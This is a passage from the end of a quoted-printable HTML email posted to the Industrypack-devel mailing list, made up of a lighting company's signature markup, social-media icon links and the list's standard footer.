<SPAN style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: =
Arial, sans-serif; COLOR: rgb(47,84,150)">
<img id=3D"v1Picture_x0020_1705436851" style=3D"BORDER-TOP-STYLE: none; BOX=
-SIZING: border-box; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BOR=
DER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none" border=3D"0" alt=3D"cid:ima=
ge007.png@01D9AE9E.92ED6EC0" src=3D"http://mail.lk-tech.com/webmail/?_task=
=3Dmail&amp;_action=3Dget&amp;_mbox=3DINBOX&amp;_uid=3D10784&amp;_token=3D3=
XGMxnBDdVVCXwM3UEjeEHvnc1YxFdfc&amp;_part=3D16&amp;_embed=3D1&amp;_mimeclas=
s=3Dimage" width=3D"19" height=3D"19"></SPAN></A>
<B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><I style=3D"BOX-SI=
ZING: border-box"><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAM=
ILY: Arial, sans-serif; BACKGROUND: white; COLOR: rgb(32,56,100)">&nbsp;</S=
PAN></I></B><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline;=
 COLOR: blue; BACKGROUND-COLOR: transparent" href=3D"https://www.youtube.co=
m/channel/UCxTOmLUSGKj4z9az00ny_2g/" rel=3Dnoreferrer target=3D_blank>
<SPAN style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: =
Arial, sans-serif; COLOR: rgb(47,84,150)">
<img id=3D"v1Picture_x0020_839915403" style=3D"BORDER-TOP-STYLE: none; BOX-=
SIZING: border-box; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BORD=
ER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none" border=3D"0" alt=3D"cid:imag=
e008.png@01D9AE9E.92ED6EC0" src=3D"http://mail.lk-tech.com/webmail/?_task=
=3Dmail&amp;_action=3Dget&amp;_mbox=3DINBOX&amp;_uid=3D10784&amp;_token=3D3=
XGMxnBDdVVCXwM3UEjeEHvnc1YxFdfc&amp;_part=3D17&amp;_embed=3D1&amp;_mimeclas=
s=3Dimage" width=3D"19" height=3D"19"></SPAN></A>
<B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><I style=3D"BOX-SI=
ZING: border-box"><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAM=
ILY: Arial, sans-serif; BACKGROUND: white; COLOR: rgb(32,56,100)">&nbsp;</S=
PAN></I></B><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline;=
 COLOR: blue; BACKGROUND-COLOR: transparent" href=3D"https://www.linkedin.c=
om/company/lk-lighting/about/" rel=3Dnoreferrer target=3D_blank>
<SPAN style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: =
Arial, sans-serif; COLOR: rgb(47,84,150)">
<img id=3D"v1Picture_x0020_704904918" style=3D"BORDER-TOP-STYLE: none; BOX-=
SIZING: border-box; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BORD=
ER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none" border=3D"0" alt=3D"cid:imag=
e009.png@01D9AE9E.92ED6EC0" src=3D"http://mail.lk-tech.com/webmail/?_task=
=3Dmail&amp;_action=3Dget&amp;_mbox=3DINBOX&amp;_uid=3D10784&amp;_token=3D3=
XGMxnBDdVVCXwM3UEjeEHvnc1YxFdfc&amp;_part=3D18&amp;_embed=3D1&amp;_mimeclas=
s=3Dimage" width=3D"19" height=3D"19"></SPAN></A>
<B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><I style=3D"BOX-SI=
ZING: border-box"><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAM=
ILY: Arial, sans-serif; BACKGROUND: white; COLOR: rgb(32,56,100)">&nbsp;</S=
PAN></I></B><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline;=
 COLOR: blue; BACKGROUND-COLOR: transparent" href=3D"https://forms.gle/ZbAe=
LJsnr6pyWJ3R9" rel=3Dnoreferrer target=3D_blank><B style=3D"BOX-SIZING: bor=
der-box; FONT-WEIGHT: bolder">
<SPAN style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: =
Arial, sans-serif; COLOR: rgb(32,56,100)">
<img id=3D"v1Picture_x0020_1808406379" style=3D"BORDER-TOP-STYLE: none; BOX=
-SIZING: border-box; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BOR=
DER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none" border=3D"0" src=3D"http://=
mail.lk-tech.com/webmail/?_task=3Dmail&amp;_action=3Dget&amp;_mbox=3DINBOX&=
amp;_uid=3D10784&amp;_token=3D3XGMxnBDdVVCXwM3UEjeEHvnc1YxFdfc&amp;_part=3D=
19&amp;_embed=3D1&amp;_mimeclass=3Dimage" width=3D"19" height=3D"19"></SPAN=
></B></A><SPAN lang=3DVI style=3D"BOX-SIZING: border-box; FONT-FAMILY: Aria=
l, sans-serif">
</SPAN></P></TD></TR></TBODY></TABLE>
<P class=3Dv1MsoNormal style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FO=
NT-FAMILY: Calibri, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEX=
T-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: norm=
al; TEXT-ALIGN: left; MARGIN: 0in 0in 0pt; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
ACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial"><SPAN style=
=3D"BOX-SIZING: border-box"></SPAN>&nbsp;</P></DIV></SPAN></SPAN></BODY></H=
TML>


--===============6241820303534788090==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6241820303534788090==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6241820303534788090==--
